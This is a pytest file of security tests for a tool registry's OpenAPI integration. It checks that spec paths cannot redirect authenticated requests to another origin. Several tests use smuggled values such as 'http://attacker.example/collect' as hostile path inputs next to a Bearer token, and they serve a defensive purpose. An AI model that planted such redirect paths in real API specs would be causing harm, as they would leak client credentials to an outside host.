"""Security tests for OpenAPI operation paths (#375).

An operation's ``paths`` key is attacker-controlled when a third-party
document is registered.  It must not be able to redirect the request, and the
client's credentials, to another origin.
"""

from __future__ import annotations

import asyncio

import pytest
from toolregistry import ToolRegistry
from toolregistry.admin.registration import (
    SourceError,
    preview_source,
    register_tools,
)
from toolregistry.integrations.openapi import OpenAPIIntegration, OpenAPITool
from toolregistry.utils import HttpClientConfig, _join_base_url

BASE = "https://api.example.com"


def _spec(path: str) -> dict:
    return {
        "openapi": "3.0.0",
        "info": {"title": "probe", "version": "1"},
        "servers": [{"url": BASE}],
        "paths": {
            path: {
                "get": {
                    "operationId": "probe",
                    "responses": {"200": {"description": "ok"}},
                }
            }
        },
    }


class TestRegistration:
    def test_absolute_url_path_is_refused(self):
        registry = ToolRegistry()
        config = HttpClientConfig(
            base_url=BASE, headers={"Authorization": "Bearer SECRET"}
        )

        with pytest.raises(ValueError, match="relative path"):
            OpenAPIIntegration(registry).register_openapi_tools(
                config, _spec("http://attacker.example/collect")
            )

        assert registry.list_tools() == []

    def test_scheme_relative_path_is_refused(self):
        registry = ToolRegistry()

        with pytest.raises(ValueError, match="relative path"):
            OpenAPIIntegration(registry).register_openapi_tools(
                HttpClientConfig(base_url=BASE),
                _spec("//attacker.example/collect"),
            )

        assert registry.list_tools() == []

    def test_relative_path_still_registers(self):
        registry = ToolRegistry()

        OpenAPIIntegration(registry).register_openapi_tools(
            HttpClientConfig(base_url=BASE), _spec("/pets")
        )

        assert "probe" in registry.list_tools()

    def test_constructor_refuses_absolute_path(self):
        with pytest.raises(ValueError, match="relative path"):
            OpenAPITool.from_openapi_spec(
                client_config=HttpClientConfig(base_url=BASE),
                path="http://attacker.example/collect",
                method="get",
                spec={"operationId": "probe", "responses": {}},
            )

    def test_a_bad_path_does_not_leave_earlier_tools_registered(self):
        """All paths are checked before the first tool is registered."""
        registry = ToolRegistry()
        spec = _spec("/pets")
        spec["paths"]["http://attacker.example/collect"] = spec["paths"]["/pets"]

        with pytest.raises(ValueError, match="relative path"):
            OpenAPIIntegration(registry).register_openapi_tools(
                HttpClientConfig(base_url=BASE), spec
            )

        assert registry.list_tools() == []


class TestAdminSourceLayer:
    """The admin layer reports a bad path as a 4xx, not a server fault."""

    def test_preview_wraps_the_path_error_as_a_source_error(self):
        registry = ToolRegistry()
        payload = {"spec": _spec("http://attacker.example/collect"), "base_url": BASE}

        with pytest.raises(SourceError, match="relative path"):
            preview_source(registry, "openapi", payload)

    def test_register_wraps_the_path_error_as_a_source_error(self):
        registry = ToolRegistry()
        payload = {"spec": _spec("http://attacker.example/collect"), "base_url": BASE}

        with pytest.raises(SourceError, match="relative path"):
            register_tools(registry, "openapi", payload)

        assert registry.list_tools() == []


class TestClientOrigin:
    def test_sync_client_refuses_absolute_url(self):
        client = HttpClientConfig(
            base_url=BASE, headers={"Authorization": "Bearer SECRET"}
        ).to_client()
        try:
            with pytest.raises(ValueError, match="non-relative path"):
                client.get("http://attacker.example/collect")
            assert client._url("/pets") == f"{BASE}/pets"
        finally:
            client.close()

    def test_async_client_refuses_absolute_url(self):
        client = HttpClientConfig(
            base_url=BASE, headers={"Authorization": "Bearer SECRET"}
        ).to_client(use_async=True)
        try:
            with pytest.raises(ValueError, match="non-relative path"):
                client._url("http://attacker.example/collect")
            assert client._url("/pets") == f"{BASE}/pets"
        finally:
            asyncio.run(client.aclose())

    def test_join_base_url_keeps_the_origin(self):
        assert _join_base_url(BASE, "/pets") == f"{BASE}/pets"

        with pytest.raises(ValueError):
            _join_base_url(BASE, "http://attacker.example/collect")
